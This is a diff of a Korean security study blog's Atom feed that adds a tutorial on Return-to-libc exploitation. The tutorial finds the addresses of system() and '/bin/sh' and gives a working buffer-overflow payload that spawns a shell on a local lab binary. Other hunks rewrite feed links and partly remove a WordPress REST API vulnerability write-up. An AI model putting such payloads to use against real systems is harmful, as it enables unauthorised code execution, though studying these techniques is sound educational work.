@@ -2,10 +2,10 @@
 
 <feed xmlns="http://www.w3.org/2005/Atom" >
   <generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator>
-  <link href="/tag/posts/feed.xml" rel="self" type="application/atom+xml" />
-  <link href="/" rel="alternate" type="text/html" />
-  <updated>2019-03-23T20:56:24+09:00</updated>
-  <id>/tag/posts/feed.xml</id>
+  <link href="http://localhost:4000/tag/posts/feed.xml" rel="self" type="application/atom+xml" />
+  <link href="http://localhost:4000/" rel="alternate" type="text/html" />
+  <updated>2019-03-24T06:07:11+09:00</updated>
+  <id>http://localhost:4000/tag/posts/feed.xml</id>
 
   
   
@@ -40,12 +40,159 @@
 
   
     <entry>
+      <title type="html">linux_0x04</title>
+      <link href="http://localhost:4000/linux_0x04" rel="alternate" type="text/html" title="linux_0x04" />
+      <published>2019-03-24T15:18:00+09:00</published>
+      <updated>2019-03-24T15:18:00+09:00</updated>
+      <id>http://localhost:4000/linux_0x04</id>
+      <content type="html" xml:base="http://localhost:4000/linux_0x04">&lt;h2 id=&quot;rtlreturn-to-library&quot;&gt;RTL(Return to Library)&lt;/h2&gt;
+
+&lt;p&gt;안녕하세요. &lt;strong&gt;Sulla&lt;/strong&gt;입니다!&lt;/p&gt;
+
+&lt;p&gt;이번에 알아볼 내용은 &lt;strong&gt;RTL&lt;/strong&gt;(Return to Library)입니다.
+먼저 &lt;strong&gt;RTL&lt;/strong&gt;이 뭔지를 알아보도록 하겠습니다.&lt;/p&gt;
+
+&lt;h1 id=&quot;rtlreturn-to-library-1&quot;&gt;RTL(Return to Library)&lt;/h1&gt;
+
+&lt;p&gt;지난 포스팅에서 &lt;strong&gt;메모리 보호 기법&lt;/strong&gt;에 대해 간단하게 봤습니다. 그 중 &lt;strong&gt;ASLR&lt;/strong&gt;은 봤고 &lt;strong&gt;DEP/NX bit&lt;/strong&gt;는 언급만 하고 넘어갔었죠. &lt;strong&gt;메모리 내부에서 코드실행을 방지&lt;/strong&gt;하기 위한 메모리 보호 기법 중 하나라고 알려 드렸습니다.&lt;/p&gt;
+
+&lt;p&gt;메모리에서의 코드 실행이 막혔기 때문에(Shellcode 실행 차단) 다른 방법을 찾아야 합니다. &lt;strong&gt;/bin/sh&lt;/strong&gt; 를 직접 실행할 수 있다면 가능할 듯 합니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-1.png&quot; alt=&quot;[그림 4-1]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;그럼 어떻게 해야할까요? 첫 포스팅에서 메모리 구조를 설명 드릴 때 위 그림을 보여 드렸었습니다.&lt;strong&gt;[스택 -&lt;/strong&gt; &lt;strong&gt;공유라이브러리 -&lt;/strong&gt; &lt;strong&gt;힙 - BSS/Data - Code]&lt;/strong&gt;으로 이뤄지며, 공유 라이브러리는 &lt;strong&gt;메모리에 미리 필요한 중요 함수들을 저장해두는 장소&lt;/strong&gt;라고 간단하게 설명 드렸었죠.
+저 &lt;strong&gt;공유 라이브러리&lt;/strong&gt;를 사용하여 &lt;strong&gt;/bin/sh&lt;/strong&gt;을 실행할 수 있지 않을까???라는 생각으로 &lt;strong&gt;RTL&lt;/strong&gt;이 연구되었다 생각되네요….(&lt;strong&gt;뇌피셜)&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;공유 라이버르러리를 간단하게 정리하자면 다음과 같습니다.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;여러 프로세스에서 동시에 사용 가능한 라이브러리&lt;/li&gt;
+  &lt;li&gt;프로그램이 시작될 때 메모리에 적재됨&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;우리는 저 &lt;strong&gt;공유 라이브러리&lt;/strong&gt; 중에서 &lt;strong&gt;system()&lt;/strong&gt; 함수를 사용하겠습니다. 해당 함수는 입력받은 문자열을 실행시키는 함수입니다. 즉, 인자값으로 &lt;strong&gt;/bin/sh&lt;/strong&gt; 를 입력한다면 &lt;strong&gt;system(“/bin/sh”);&lt;/strong&gt;과 같은 형태가 되며 &lt;strong&gt;system()&lt;/strong&gt;이 &lt;strong&gt;/bin/sh&lt;/strong&gt;를 실행하게 됩니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-2.png&quot; alt=&quot;[그림 4-2]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;RTL&lt;/strong&gt;의 흐름을 위와 같이 표현했습니다. &lt;strong&gt;libc&lt;/strong&gt;(공유라이브러리)의 함수(&lt;strong&gt;system()&lt;/strong&gt;)를 사용해서 &lt;strong&gt;8byte&lt;/strong&gt; 뒤에 &lt;strong&gt;/bin/sh&lt;/strong&gt; 의 주소를 박아두면 &lt;strong&gt;system()&lt;/strong&gt;이 &lt;strong&gt;/bin/sh&lt;/strong&gt; 를 실행하여 &lt;strong&gt;shell&lt;/strong&gt;을 따내게 됩니다. 
+즉, &lt;strong&gt;버퍼 + sfp + system() + AAAA + /bin/sh&lt;/strong&gt; 처럼 표현 가능할 듯 합니다.&lt;/p&gt;
+
+&lt;p&gt;여기서 왜 &lt;strong&gt;system()&lt;/strong&gt; 뒤에 인자값으로 바로 &lt;strong&gt;/bin/sh/&lt;/strong&gt;가 아닌 잉여값 “&lt;strong&gt;AAAA&lt;/strong&gt;“을 입력할까요? 그냥 바로 인자값을 입력하면 인식을 못할까요?&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-3.png&quot; alt=&quot;[그림 4-3]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;system(“/bin/sh”)&lt;/strong&gt; 이 입력된 상태에서 함수가 종료되면 에필로그 과정을 가집니다. 에필로그 과정 중 ret(pop eip) 과정을 거치며 system() 함수의 주소를 eip에  옮기게 되죠.이과정에 pop 명령을 사용 했기에 스택에 공간이 생깁니다. 그런 다음 system() 함수의 프롤로그 과정을 가지며 push ebp, mov ebp, esp 과정을 거치며 새롭게 메모리의 영역을 확보하죠. 
+즉, AAAA의 위치는 system 함수가 끝난 뒤의 ret 구역이 되며 잉여값을 배치해주고, 다음 공간에 원하는 주소값을 위치시켜 줍니다. 좀더 확실하게 알아보도록 하죠.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-4.png&quot; alt=&quot;[그림 4-4]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;위 사진에서와 같이 system() 내부를 들여다 보면 프로로그 과정을 거치고 EBP에서 8byte 떨어진 주소를 참조합니다. EBP 는 4byte를 가지고 우리는 남은 4byte만 채워준 뒤 원하는 주소를 입력해준다면 인자값을 정상적으로 인식하게 됩니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Return to Library&lt;/strong&gt;라는 이름을 아주 성실하게 이행하는 모습이네요. 사실 더 설명드릴게 없습니다. 약간만 응용한 기술이기에 새롭게 설명 들릴만한 내용은 없다고 생각 되네요. 그럼 직접 시작해보곘습니다. 먼저 찾아야 할 주소는 아래와 같습니다.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;strong&gt;system()&lt;/strong&gt; 주소 = ????&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;/bin/sh&lt;/strong&gt; 주소 = ????&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;1번 system 주소부터 확인 하도록 하겠습니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-5.png&quot; alt=&quot;[그림 4-5]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;먼저 브레이크를 main 함수에 잡아주고 구동 시킵니다.bp에 멈추고 나면 print 명령을 사용해 system()의 주소를 확인 하시면 됩니다.(system의 주소를 못 찾는 심볼을 찾을수 없다는 에러가 뜨는 경우 static 옵션을 뺴고 ggdb 옵션을 붙여서 컴파일 해주세요….개고생 했습니다…..)&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;strong&gt;system()&lt;/strong&gt; 주소 = &lt;strong&gt;0x4203f2c0&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;/bin/sh&lt;/strong&gt; 주소 = ????&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;이제 /bin/sh의 주소를 구해야 합니다. 실제로는 /lib/libc.so.6 라이브러리 파일 내의 /bin/sh와 system 의 오프셋을 구해서 최종적인 문자열 주소를 찾을수 있지만 아래의 반복문을 통해서 쉽게 구해보겠습니다.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;01 #include &amp;lt;stdio.h&amp;gt;
+02 
+03 int main(){
+04   long shell=0x4203f2c0; //system()의 주소를 입력해 주시면 됩니다.
+05 	 while(memcmp((void*)shell,(&quot;/bin/sh&quot;),8))
+06   shell++;
+07 	 printf(&quot;%p\n&quot;,shell);
+08 }
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;코드의 중요 라인인 5라인만 설명 드리자면 &lt;strong&gt;memcmp&lt;/strong&gt; 함수를 사용해서 &lt;strong&gt;바이트 데이터를 비교&lt;/strong&gt; 하는 과정입니다. &lt;strong&gt;memcmp(인자1, 인자2, 사이즈)&lt;/strong&gt;의 기본형을 가지며 &lt;strong&gt;인자 1&lt;/strong&gt;의 첫 바이트와 &lt;strong&gt;인자 2&lt;/strong&gt;의 첫 바이트를 &lt;strong&gt;사이즈&lt;/strong&gt; 만큼 비교하는 것이며, 이 과정을 통해서 &lt;strong&gt;system()내부에 /bin/sh 문자열을&lt;/strong&gt; 찾아내며 결과적으로 &lt;strong&gt;주소값으로 리턴&lt;/strong&gt; 해줍니다. 돌려줍시다~&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-6.png&quot; alt=&quot;[그림 4-6]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;strong&gt;system()&lt;/strong&gt; 주소 = &lt;strong&gt;0x4203f2c0&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;/bin/sh&lt;/strong&gt; 주소 = &lt;strong&gt;0x42127ea4&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;최종적으로 system() 과 /bin/sh 의 주소값을 찾아냈습니다. 이제 찾아낸 정보를 바탕으로 공격 페이로드를 작성해 보겠습니다.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./bof1 `python -c 'print &quot;AAAA&quot;*11 + &quot;\xc0\xf2\x03\x42&quot; + &quot;AAAA&quot; + &quot;\xa4\x7e\x12\x42&quot;'`
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;마지막으로 페이로드를 정리 하고 직접 때려보도록 하겠습니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-7.png&quot; alt=&quot;[그림 4-7]&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;먼저 버버 크기(40byte)와 sfp(4byte) 를 채워 주고 공유 라이브러리에 위치한 system() 함수를 저장시킵니다. 다음 위치에는 AAAA의 4byte를 채워 줍니다. 이유는 위에서 알려 드렸듯 system()의 인자값은 8byte 뒤에 위치하기에 그 거리만큼 벌려 주고 우리가 필요로 하는 /bin/sh을 위치 시켜 줌으로서 system()이 인자값으로 /bin/sh을 정상적으로 받을수 있게 설계해준겁니다.&lt;/p&gt;
+
+&lt;p&gt;설명은 이쯤 해두고 진짜 직접 떄려보도록 하겠습니다.&lt;/p&gt;
+
+&lt;figure&gt;
+  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/exm1.png&quot; alt=&quot;[그림 4-8]&quot; /&gt;
+&lt;/figure&gt;
+&lt;p&gt;원하던 shell을 떨어졌습니다. 짧게 끝날줄 알았는데 이번편도 주절주절 양이 많았네요. 다음 포스팅에서는 RTL Chaining을 알아보겠습니다. 감사합니다.
+뿅!&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      <author>
+          <name>Sulla</name>
+        
+        
+      </author>
+
+      
+
+      
+        <category term="Posts" />
+      
+
+      
+        <summary type="html">RTL(Return to Library)</summary>
+      
+
+      
+      
+    </entry>
+  
+    <entry>
       <title type="html">windows-0x08</title>
-      <link href="/windows-0x08" rel="alternate" type="text/html" title="windows-0x08" />
+      <link href="http://localhost:4000/windows-0x08" rel="alternate" type="text/html" title="windows-0x08" />
       <published>2019-03-19T20:18:00+09:00</published>
       <updated>2019-03-19T20:18:00+09:00</updated>
-      <id>/windows-0x08</id>
-      <content type="html" xml:base="/windows-0x08">&lt;h1 id=&quot;0x08-dep2&quot;&gt;0x08 DEP(2)&lt;/h1&gt;
+      <id>http://localhost:4000/windows-0x08</id>
+      <content type="html" xml:base="http://localhost:4000/windows-0x08">&lt;h1 id=&quot;0x08-dep2&quot;&gt;0x08 DEP(2)&lt;/h1&gt;
 
 &lt;h5 id=&quot;what-is-dep&quot;&gt;What is DEP?&lt;/h5&gt;
 
@@ -178,11 +325,11 @@
   
     <entry>
       <title type="html">windows-0x07</title>
-      <link href="/windows-0x07" rel="alternate" type="text/html" title="windows-0x07" />
+      <link href="http://localhost:4000/windows-0x07" rel="alternate" type="text/html" title="windows-0x07" />
       <published>2019-03-19T19:18:00+09:00</published>
       <updated>2019-03-19T19:18:00+09:00</updated>
-      <id>/windows-0x07</id>
-      <content type="html" xml:base="/windows-0x07">&lt;h1 id=&quot;0x07-dep1&quot;&gt;0x07 DEP(1)&lt;/h1&gt;
+      <id>http://localhost:4000/windows-0x07</id>
+      <content type="html" xml:base="http://localhost:4000/windows-0x07">&lt;h1 id=&quot;0x07-dep1&quot;&gt;0x07 DEP(1)&lt;/h1&gt;
 
 &lt;h5 id=&quot;what-is-dep&quot;&gt;What is DEP?&lt;/h5&gt;
 
@@ -344,11 +491,11 @@
   
     <entry>
       <title type="html">windows-0x06</title>
-      <link href="/windows-0x06" rel="alternate" type="text/html" title="windows-0x06" />
+      <link href="http://localhost:4000/windows-0x06" rel="alternate" type="text/html" title="windows-0x06" />
       <published>2019-03-18T19:18:00+09:00</published>
       <updated>2019-03-18T19:18:00+09:00</updated>
-      <id>/windows-0x06</id>
-      <content type="html" xml:base="/windows-0x06">&lt;h1 id=&quot;0x06-gs2&quot;&gt;0x06 GS(2)&lt;/h1&gt;
+      <id>http://localhost:4000/windows-0x06</id>
+      <content type="html" xml:base="http://localhost:4000/windows-0x06">&lt;h1 id=&quot;0x06-gs2&quot;&gt;0x06 GS(2)&lt;/h1&gt;
 
 &lt;h5 id=&quot;safeseh&quot;&gt;SafeSEH&lt;/h5&gt;
 
@@ -416,11 +563,11 @@
   
     <entry>
       <title type="html">DLL Hijacking &amp;amp; Ghidra</title>
-      <link href="/Dll-Hijacking-&-Ghidra" rel="alternate" type="text/html" title="DLL Hijacking &amp; Ghidra" />
+      <link href="http://localhost:4000/Dll-Hijacking-&-Ghidra" rel="alternate" type="text/html" title="DLL Hijacking &amp; Ghidra" />
       <published>2019-03-17T19:18:00+09:00</published>
       <updated>2019-03-17T19:18:00+09:00</updated>
-      <id>/Dll%20Hijacking%20&amp;%20Ghidra</id>
-      <content type="html" xml:base="/Dll-Hijacking-&amp;-Ghidra">&lt;h1 id=&quot;dll-hijacking--ghidra&quot;&gt;DLL Hijacking &amp;amp; Ghidra&lt;/h1&gt;
+      <id>http://localhost:4000/Dll%20Hijacking%20&amp;%20Ghidra</id>
+      <content type="html" xml:base="http://localhost:4000/Dll-Hijacking-&amp;-Ghidra">&lt;h1 id=&quot;dll-hijacking--ghidra&quot;&gt;DLL Hijacking &amp;amp; Ghidra&lt;/h1&gt;
 
 &lt;p&gt;안녕하세요. Joel입니다.&lt;/p&gt;
 
@@ -567,11 +714,11 @@ extern &quot;C&quot; __declspec(dllexport) void PlaySoundA() {
   
     <entry>
       <title type="html">mobile-0x00</title>
-      <link href="/android-0x00" rel="alternate" type="text/html" title="mobile-0x00" />
+      <link href="http://localhost:4000/android-0x00" rel="alternate" type="text/html" title="mobile-0x00" />
       <published>2019-03-16T06:00:00+09:00</published>
       <updated>2019-03-16T06:00:00+09:00</updated>
-      <id>/android-0x00</id>
-      <content type="html" xml:base="/android-0x00">&lt;h1 id=&quot;0x00-introduction&quot;&gt;0x00. Introduction&lt;/h1&gt;
+      <id>http://localhost:4000/android-0x00</id>
+      <content type="html" xml:base="http://localhost:4000/android-0x00">&lt;h1 id=&quot;0x00-introduction&quot;&gt;0x00. Introduction&lt;/h1&gt;
 
 &lt;p&gt;안녕하세요. Chaem 입니다.&lt;/p&gt;
 
@@ -708,11 +855,11 @@ OWASP 모바일 보안 프로젝트는 개발자와 보안팀이 모바일 어�
   
     <entry>
       <title type="html">linux_0x03</title>
-      <link href="/linux_0x03" rel="alternate" type="text/html" title="linux_0x03" />
+      <link href="http://localhost:4000/linux_0x03" rel="alternate" type="text/html" title="linux_0x03" />
       <published>2019-03-11T19:18:00+09:00</published>
       <updated>2019-03-11T19:18:00+09:00</updated>
-      <id>/linux_0x03</id>
-      <content type="html" xml:base="/linux_0x03">&lt;h2 id=&quot;0x03---basic-bof--메모리-보호-기법&quot;&gt;0x03 - Basic BOF &amp;amp; 메모리 보호 기법&lt;/h2&gt;
+      <id>http://localhost:4000/linux_0x03</id>
+      <content type="html" xml:base="http://localhost:4000/linux_0x03">&lt;h2 id=&quot;0x03---basic-bof--메모리-보호-기법&quot;&gt;0x03 - Basic BOF &amp;amp; 메모리 보호 기법&lt;/h2&gt;
 
 &lt;p&gt;안녕하세요! &lt;strong&gt;Sulla&lt;/strong&gt;임돠….&lt;/p&gt;
 
@@ -874,11 +1021,11 @@ OWASP 모바일 보안 프로젝트는 개발자와 보안팀이 모바일 어�
   
     <entry>
       <title type="html">web-0x02</title>
-      <link href="/web-0x02" rel="alternate" type="text/html" title="web-0x02" />
+      <link href="http://localhost:4000/web-0x02" rel="alternate" type="text/html" title="web-0x02" />
       <published>2019-03-11T04:00:00+09:00</published>
       <updated>2019-03-11T04:00:00+09:00</updated>
-      <id>/web-0x02</id>
-      <content type="html" xml:base="/web-0x02">&lt;h1 id=&quot;lfi-to-rce-on-phpmyadmin-480--481&quot;&gt;LFI to RCE on PHPMyAdmin 4.8.0 ~ 4.8.1&lt;/h1&gt;
+      <id>http://localhost:4000/web-0x02</id>
+      <content type="html" xml:base="http://localhost:4000/web-0x02">&lt;h1 id=&quot;lfi-to-rce-on-phpmyadmin-480--481&quot;&gt;LFI to RCE on PHPMyAdmin 4.8.0 ~ 4.8.1&lt;/h1&gt;
 
 &lt;p&gt;안녕하세요 hackyu입니다.&lt;/p&gt;
 
@@ -1176,11 +1323,11 @@ https://www.youtube.com/watch?v=bT-00ZUTq0o&lt;/li&gt;
   
     <entry>
       <title type="html">windows-0x05</title>
-      <link href="/windows-0x05" rel="alternate" type="text/html" title="windows-0x05" />
+      <link href="http://localhost:4000/windows-0x05" rel="alternate" type="text/html" title="windows-0x05" />
       <published>2019-03-09T19:18:00+09:00</published>
       <updated>2019-03-09T19:18:00+09:00</updated>
-      <id>/windows-0x05</id>
-      <content type="html" xml:base="/windows-0x05">&lt;h1 id=&quot;0x05-gs&quot;&gt;0x05 GS&lt;/h1&gt;
+      <id>http://localhost:4000/windows-0x05</id>
+      <content type="html" xml:base="http://localhost:4000/windows-0x05">&lt;h1 id=&quot;0x05-gs&quot;&gt;0x05 GS&lt;/h1&gt;
 
 &lt;h5 id=&quot;what-is-gs&quot;&gt;What is GS?&lt;/h5&gt;
 
@@ -1368,11 +1515,11 @@ https://www.youtube.com/watch?v=bT-00ZUTq0o&lt;/li&gt;
   
     <entry>
       <title type="html">windows-0x04</title>
-      <link href="/windows-0x04" rel="alternate" type="text/html" title="windows-0x04" />
+      <link href="http://localhost:4000/windows-0x04" rel="alternate" type="text/html" title="windows-0x04" />
       <published>2019-03-03T19:18:00+09:00</published>
       <updated>2019-03-03T19:18:00+09:00</updated>
-      <id>/windows-0x04</id>
-      <content type="html" xml:base="/windows-0x04">&lt;h1 id=&quot;0x04-random-stack&quot;&gt;0x04 Random STACK&lt;/h1&gt;
+      <id>http://localhost:4000/windows-0x04</id>
+      <content type="html" xml:base="http://localhost:4000/windows-0x04">&lt;h1 id=&quot;0x04-random-stack&quot;&gt;0x04 Random STACK&lt;/h1&gt;
 
 &lt;h5 id=&quot;what-is-random-stack&quot;&gt;What is Random STACK?&lt;/h5&gt;
 
@@ -1465,380 +1612,6 @@ JMP ESP의 주소를 찾을 수 있게 됩니다.&lt;/p&gt;
 
       
         <summary type="html">0x04 Random STACK</summary>
-      
-
-      
-      
-    </entry>
-  
-    <entry>
-      <title type="html">web-0x01</title>
-      <link href="/web-0x01" rel="alternate" type="text/html" title="web-0x01" />
-      <published>2019-02-25T10:20:00+09:00</published>
-      <updated>2019-02-25T10:20:00+09:00</updated>
-      <id>/web-0x01</id>
-      <content type="html" xml:base="/web-0x01">&lt;h1 id=&quot;privilege-escalation--content-injection-on-wordpress-470--471&quot;&gt;Privilege Escalation / Content Injection On Wordpress 4.7.0 ~ 4.7.1&lt;/h1&gt;
-
-&lt;h5 id=&quot;privilege-escalation--content-injection&quot;&gt;Privilege Escalation / Content Injection?&lt;/h5&gt;
-
-&lt;p&gt;Wordpress 4.7.0 버전부터 기본적으로 활성화되는 Wordpress Rest API를 통해 게시물에 대한 접근, 읽기, 수정, 삭제 등의 기능을 사용할 수 있게 되었으며, 기본적으로 사용하게 된 Rest API를 통해 Wordpress 4.7.0과 4.7.1버전에서 Privilege Escaltion / Content Injection 취약점이 발생했습니다.&lt;/p&gt;
-
-&lt;p&gt;Privilege Escalation은 관리자가 작성한 게시물을 포함한 모든 게시물에 접근이 가능한 것을 말하며 Content Injection은 접근이 가능한 게시물의 내용을 변경할 수 있는 것을 뜻합니다.&lt;/p&gt;
-
-&lt;h5 id=&quot;취약점-분석&quot;&gt;취약점 분석&lt;/h5&gt;
-&lt;ul&gt;
-  &lt;li&gt;&lt;strong&gt;환경구성&lt;/strong&gt;&lt;br /&gt;
-    &lt;ul&gt;
-      &lt;li&gt;Apache 2.4.18&lt;br /&gt;&lt;/li&gt;
-      &lt;li&gt;PHP 7.0.30&lt;br /&gt;&lt;/li&gt;
-      &lt;li&gt;Wordpress 4.7.1&lt;br /&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;사용자가 게시물 수정 요청을 하면 서버는 Rest API를 통해 게시물 수정 작업을 하기 위해 class-wp-rest-posts-controller.php에 존재하는 update_item_permission_check 함수와 update_item함수를 콜백합니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x01_1.png&quot; /&gt;
-  &lt;figcaption&gt;&lt;center&gt;[그림 1-1]
-  게시물 수정 요청 및 처리
-  &lt;/center&gt;&lt;/figcaption&gt;
-&lt;/figure&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;register_rest_route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;rest_base&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/(?P&amp;lt;id&amp;gt;[\d]+)'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'methods'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;             &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WP_REST_Server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;READABLE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'callback'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'get_item'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'permission_callback'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'get_item_permissions_check'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'args'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$get_item_args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'methods'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;             &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WP_REST_Server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;EDITABLE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'callback'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'update_item'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
